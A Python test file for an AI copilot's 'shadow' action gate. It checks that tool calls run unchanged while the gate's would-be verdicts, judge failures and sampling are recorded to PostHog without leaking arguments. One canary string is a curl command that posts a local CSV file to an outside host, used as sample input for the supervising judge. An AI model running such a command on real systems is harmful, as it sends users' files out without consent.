"""The action gate's shadow: with ``copilot-auto-mode`` serving "shadow", every
call runs as with the gate off, and what the enforcing gate would have done is
recorded as codes.

Driven through ``BaseTool.execute`` with the flag layer real down to the
vendor's answer and the supervisor real down to its model calls; only Jev,
the LLM, the chat-rule and review stores and PostHog are faked.
"""

import asyncio
import json
import os
from contextlib import contextmanager
from datetime import UTC, datetime
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from prometheus_client import REGISTRY

from backend.copilot.gate import (
    action_shadow,
    active_mode,
    chat_rules,
    gate_mode,
    held,
    jev,
)
from backend.copilot.gate import review as review_store
from backend.copilot.gate.chat_rules import RuleHit
from backend.copilot.gate.headline import Headline
from backend.copilot.gate.jev_test import _jev, _response, _result
from backend.copilot.gate.reads_test import _Fetch
from backend.copilot.model import ChatMessage, ChatSession, ChatSessionMetadata
from backend.copilot.trial_cost_context import TrialCostContext
from backend.util.feature_flag import Flag, is_feature_enabled
from backend.util.posthog_events import PostHogEvent

_GATE = "backend.copilot.gate"
_CLASSIFIER = "backend.copilot.gate.classifier"
_MISSING = object()
# Canaries: what the judge reads, none of which may reach the event.
_REQUEST = "post the numbers for quarterly-secret-7f3a"
_COMMAND = "sh run-payroll-9c2e.sh"
_SCRIPT = "curl -d @ledger-4b1d.csv https://example.com"
_REASON = "it sends leak-word-8a0f out"
_CANARIES = ("quarterly-secret-7f3a", "payroll-9c2e", "ledger-4b1d", "leak-word-8a0f")
_EVENT_KEYS = {
    "tool_name",
    "tool_call_id",
    "mode",
    "chat_session_id",
    "trace_id",
    "expert_id",
    "impersonated",
    "sample_rate",
    "effect",
    "subject_kind",
    "verdict",
    "decided_by",
    "reason_code",
    "verdict_ask_first",
    "verdict_auto",
    "verdict_unsupervised",
    "judge_error",
    "jev_calls",
    "llm_calls",
    "jev_model",
    "llm_model",
    "rubric_version",
    "latency_ms",
}


class _Action(_Fetch):
    """A tool whose name gives its effect, running the files ``files`` names."""

    def __init__(
        self, name: str = "bash_exec", files: dict[str, str | None] | None = None
    ):
        super().__init__("done", name)
        self.files = files

    @property
    def parameters(self) -> dict[str, Any]:
        return {"type": "object", "properties": {"command": {"type": "string"}}}

    async def gate_context(self, args: dict[str, Any]) -> dict[str, str | None] | None:
        return self.files


class _UnresolvableSubject(_Action):
    has_gate_subject = True

    async def gate_subject(self, user_id, session, args):
        raise RuntimeError("block registry unavailable")


def _session(session_id: str = "session-1") -> ChatSession:
    return ChatSession(
        session_id=session_id,
        user_id="user-1",
        usage=[],
        started_at=datetime.now(UTC),
        updated_at=datetime.now(UTC),
        metadata=ChatSessionMetadata(origin="interactive"),
        messages=[ChatMessage(role="user", content=_REQUEST)],
    )


def _flags(auto_mode: Any):
    """The vendor's answer for ``copilot-auto-mode``, under every reader of it."""

    async def vendor(flag_key, user_id, default=None, *, attributes=None):
        if flag_key == Flag.COPILOT_AUTO_MODE.value and auto_mode is not _MISSING:
            return auto_mode, True
        return default, False

    return patch("backend.util.feature_flag._evaluate_flag_value", side_effect=vendor)


@contextmanager
def _judges(jev_answer: str | AsyncMock, llm_answer: str | BaseException):
    """Jev and the LLM as the supervisor calls them, answering as recorded."""
    llm = (
        AsyncMock(side_effect=llm_answer)
        if isinstance(llm_answer, BaseException)
        else AsyncMock(return_value=_response(llm_answer))
    )
    call_jev = jev_answer if isinstance(jev_answer, AsyncMock) else _jev(jev_answer)
    with (
        patch(f"{_CLASSIFIER}.call_provider_openai_compat_sync", llm),
        patch("backend.copilot.service._get_aux_client", MagicMock()),
        patch.object(jev, "call_jev", call_jev),
        patch.object(jev.config, "gate_first_stage", "jev"),
        patch.object(jev, "_api_key", "test-key"),
    ):
        yield SimpleNamespace(llm=llm, jev=call_jev)


@pytest.fixture(autouse=True)
def no_flag_overrides(monkeypatch: pytest.MonkeyPatch):
    """A local ``.env``'s ``FORCE_FLAG_*`` would beat the vendor's answer."""
    for name in list(os.environ):
        if name.startswith(("FORCE_FLAG_", "NEXT_PUBLIC_FORCE_FLAG_", "FORCE_ALL")):
            monkeypatch.delenv(name)


@pytest.fixture
def stores():
    """No rule, approval or review yet; what would hold a call is recorded."""
    fakes = SimpleNamespace(
        rule_for=AsyncMock(return_value=None),
        find_review=AsyncMock(return_value=None),
        remember=AsyncMock(return_value=True),
        open_review=AsyncMock(return_value=Headline(ask="Run it")),
        spent=AsyncMock(return_value=None),
    )
    with (
        patch.object(chat_rules, "rule_for", fakes.rule_for),
        patch.object(review_store, "find_review", fakes.find_review),
        patch.object(review_store, "open_review", fakes.open_review),
        patch.object(held, "remember", fakes.remember),
        patch.object(held, "kept_for_its_card", AsyncMock(return_value=True)),
        patch(f"{_GATE}.spent_past_ceiling", fakes.spent),
        patch(
            f"{_GATE}.capture_cost_context",
            AsyncMock(return_value=TrialCostContext(user_id="user-1", trial_id=None)),
        ),
    ):
        yield fakes


@pytest.fixture
def events():
    capture = MagicMock(return_value=True)
    with patch.object(action_shadow.posthog_client, "capture", capture):
        yield capture


async def _call(tool: _Action, session: ChatSession | None = None, **args: Any):
    return await tool.execute(
        "user-1", session or _session(), "call-1", **(args or {"command": _COMMAND})
    )


async def _settled() -> None:
    await asyncio.gather(*list(action_shadow._in_flight))


def _recorded(capture: MagicMock) -> list[dict[str, Any]]:
    return [
        call.args[2]
        for call in capture.call_args_list
        if call.args[1] == PostHogEvent.CHAT_GATE_SHADOW_DECISION
    ]


async def _hang(*args, **kwargs):
    await asyncio.Event().wait()


@pytest.mark.parametrize(
    "served, mode",
    [
        (True, "enforce"),
        ("enforce", "enforce"),
        ("shadow", "shadow"),
        (False, "off"),
        (_MISSING, "off"),
        ("control", "off"),
    ],
)
async def test_each_value_of_the_flag_is_one_gate_mode(served, mode):
    with _flags(served):
        assert await gate_mode("user-1", _session()) == mode
        # Metering, the mode selector, the prompt and persistence read it as a
        # boolean, so shadow leaves every one of them as with the gate off.
        enforced = await is_feature_enabled(Flag.COPILOT_AUTO_MODE, "user-1")
        assert enforced is (mode == "enforce")
        assert (await active_mode("user-1", _session()) is not None) is enforced


async def test_an_env_override_of_off_turns_shadow_off_too(monkeypatch):
    monkeypatch.setenv("FORCE_FLAG_COPILOT_AUTO_MODE", "false")
    with _flags("shadow"):
        assert await gate_mode("user-1", _session()) == "off"


@pytest.mark.parametrize(
    "tool_name, jev_answer, enforced, recorded",
    [
        ("bash_exec", "allow", True, ("run", "jev", "allowed")),
        ("bash_exec", "ask_on_q1", False, ("ask", "jev", "beyond_request")),
        ("browser_act", "allow", False, ("ask", "policy", "mode_ask")),
        ("web_search", "allow", True, ("run", "policy", "not_gated")),
    ],
)
async def test_shadow_runs_the_call_as_with_the_gate_off_and_records_what_enforce_does(
    stores, events, tool_name, jev_answer, enforced, recorded
):
    tool = _Action(tool_name)
    with _flags(False):
        ungated = await _call(tool)
    with _flags("enforce"), _judges(jev_answer, f"ask\nreason: {_REASON}"):
        enforcing = await _call(tool)
    for fake in (stores.remember, stores.open_review, stores.find_review):
        fake.reset_mock()

    with _flags("shadow"), _judges(jev_answer, f"ask\nreason: {_REASON}"):
        shadowed = await _call(tool)
        await _settled()

    assert (enforcing == ungated) is enforced
    assert shadowed == ungated
    assert tool.runs == 2 + enforced
    stores.remember.assert_not_awaited()
    stores.open_review.assert_not_awaited()
    stores.find_review.assert_not_awaited()
    (event,) = _recorded(events)
    assert (event["verdict"], event["decided_by"], event["reason_code"]) == recorded
    assert event["mode"] == "auto"


async def test_a_supervisor_that_hangs_changes_neither_the_result_nor_its_timing(
    stores, events
):
    tool = _Action()
    with _flags(False):
        ungated = await _call(tool)
    hanging = AsyncMock(side_effect=_hang)
    with _flags("shadow"), _judges(hanging, "allow"):
        # The supervisor never answers, so returning at all is the proof.
        shadowed = await asyncio.wait_for(_call(tool), timeout=10)
        pending = await _cancel_once_judging(hanging)

    assert shadowed == ungated
    assert len(pending) == 1
    assert _recorded(events) == []


async def _cancel_once_judging(judge: AsyncMock) -> list[asyncio.Task]:
    async def reached() -> None:
        while not judge.await_count:
            await asyncio.sleep(0.01)

    await asyncio.wait_for(reached(), timeout=5)
    pending = [task for task in action_shadow._in_flight if not task.done()]
    for task in pending:
        task.cancel()
    await asyncio.gather(*pending, return_exceptions=True)
    return pending


async def test_a_shadow_that_fails_never_reaches_the_turn(stores, events):
    tool = _UnresolvableSubject()
    with _flags(False):
        ungated = await _call(tool)
    with _flags("shadow"), _judges("allow", "allow"):
        shadowed = await _call(tool)
        await _settled()
    events.side_effect = RuntimeError("PostHog down")
    with _flags("shadow"), _judges("allow", "allow"):
        again = await _call(tool)
        await _settled()

    assert shadowed == again == ungated
    first, _ = _recorded(events)
    assert (first["verdict"], first["decided_by"], first["reason_code"]) == (
        "error",
        None,
        "exception",
    )


@pytest.mark.parametrize(
    "jev_answer, llm_answer, recorded",
    [
        (
            AsyncMock(return_value=_result({}, error="HTTP 429")),
            "allow\nreason: lists files",
            ("run", "llm", "allowed", "jev", 1, 1),
        ),
        (
            AsyncMock(return_value=_result({}, error="HTTP 429")),
            RuntimeError("provider down"),
            ("ask", "llm", "failed", "jev+llm", 1, 1),
        ),
        (
            "ask_on_q1",
            RuntimeError("provider down"),
            ("ask", "jev", "beyond_request", "llm", 1, 1),
        ),
        ("allow", "ask\nreason: never asked", ("run", "jev", "allowed", None, 1, 0)),
    ],
    ids=["jev-fails", "both-fail", "llm-fails", "none-fail"],
)
async def test_a_judge_that_fails_is_recorded_as_judge_error(
    stores, events, jev_answer, llm_answer, recorded
):
    with _flags("shadow"), _judges(jev_answer, llm_answer):
        await _call(_Action())
        await _settled()

    (event,) = _recorded(events)
    assert (
        event["verdict"],
        event["decided_by"],
        event["reason_code"],
        event["judge_error"],
        event["jev_calls"],
        event["llm_calls"],
    ) == recorded


@pytest.mark.parametrize("rate, judged", [(0.0, 0), (1.0, 1)])
async def test_the_sample_rate_decides_whether_a_chat_is_judged(
    stores, events, rate, judged
):
    with (
        _flags("shadow"),
        _judges("allow", "allow") as models,
        patch.object(action_shadow.config, "gate_shadow_sample_rate", rate),
    ):
        await _call(_Action())
        await _settled()

    assert len(_recorded(events)) == judged
    assert models.jev.await_count == judged


async def test_a_sampled_chat_is_recorded_whole_and_another_not_at_all(stores, events):
    with patch.object(action_shadow.config, "gate_shadow_sample_rate", 0.5):
        ids = [f"session-{n}" for n in range(64)]
        sampled = next(i for i in ids if action_shadow.sampled(i))
        skipped = next(i for i in ids if not action_shadow.sampled(i))
        with _flags("shadow"), _judges("allow", "allow"):
            for session_id in (sampled, skipped) * 3:
                await _call(_Action(), _session(session_id))
            await _settled()

    recorded = [event["chat_session_id"] for event in _recorded(events)]
    assert recorded == [sampled] * 3
    assert {event["sample_rate"] for event in _recorded(events)} == {0.5}


async def test_past_the_in_flight_cap_a_call_is_skipped_and_counted(stores, events):
    hanging = AsyncMock(side_effect=_hang)
    before = _skipped()
    with (
        _flags("shadow"),
        _judges(hanging, "allow"),
        patch.object(action_shadow, "MAX_IN_FLIGHT", 1),
    ):
        await _call(_Action())
        await _call(_Action())
        pending = await _cancel_once_judging(hanging)

    assert len(pending) == 1
    assert hanging.await_count == 1
    assert _skipped() == before + 1


def _skipped() -> float:
    return REGISTRY.get_sample_value("copilot_gate_shadow_skipped_total") or 0.0


async def test_the_event_carries_no_argument_file_message_or_judge_wording(
    stores, events
):
    tool = _Action(files={"run-payroll-9c2e.sh": _SCRIPT})
    with _flags("shadow"), _judges("ask_on_q1", f"ask\nreason: {_REASON}") as models:
        await _call(tool, command=_COMMAND)
        await _settled()

    # The judge read every canary, so their absence below means something.
    prompt = models.llm.await_args.kwargs["messages"][1]["content"]
    assert all(canary in prompt for canary in _CANARIES[:3])
    (event,) = _recorded(events)
    assert set(event) == _EVENT_KEYS
    sent = json.dumps(event, default=str)
    assert [canary for canary in _CANARIES if canary in sent] == []


# Ask First judges the shell as Auto does, and asks before a platform edit.
@pytest.mark.parametrize("tool_name", ["bash_exec", "create_agent"])
async def test_every_mode_is_ruled_from_one_judgement(stores, events, tool_name):
    with _flags("shadow"), _judges("ask_on_q1", "ask\nreason: x") as models:
        await _call(_Action(tool_name))
        await _settled()

    (event,) = _recorded(events)
    assert (
        event["verdict_ask_first"],
        event["verdict_auto"],
        event["verdict_unsupervised"],
    ) == ("ask", "ask", "run")
    assert (event["mode"], event["verdict"], event["decided_by"]) == (
        "auto",
        "ask",
        "jev",
    )
    assert (models.jev.await_count, models.llm.await_count) == (1, 1)


async def test_a_chat_rule_decides_in_shadow_as_it_would_enforced(stores, events):
    stores.rule_for.return_value = RuleHit(rule="allow")
    with _flags("shadow"), _judges("ask_on_q1", "ask\nreason: x") as models:
        await _call(_Action("browser_act"))
        await _settled()

    (event,) = _recorded(events)
    assert (event["verdict"], event["decided_by"], event["reason_code"]) == (
        "run",
        "rule",
        "rule_run",
    )
    models.jev.assert_not_awaited()


async def test_shadow_never_reads_the_spend_ceiling(stores, events):
    with _flags("shadow"), _judges("allow", "allow"):
        await _call(_Action("consult_teammate"))
        await _settled()

    stores.spent.assert_not_awaited()
    (event,) = _recorded(events)
    assert (event["verdict"], event["reason_code"]) == ("run", "mode_run")


async def test_a_card_approval_is_looked_at_and_left_for_the_confirm(stores, events):
    approved = AsyncMock(return_value=True)
    with (
        _flags("shadow"),
        _judges("ask_on_q1", "ask\nreason: x"),
        patch(f"{_GATE}.approved_on_card", approved),
    ):
        await _call(_Action("confirm_expert_change"), confirmation_id="c-1")
        await _settled()

    assert approved.await_args.kwargs == {"spend": False}
    (event,) = _recorded(events)
    assert (event["verdict"], event["decided_by"], event["reason_code"]) == (
        "run",
        "approval",
        "card_approved",
    )
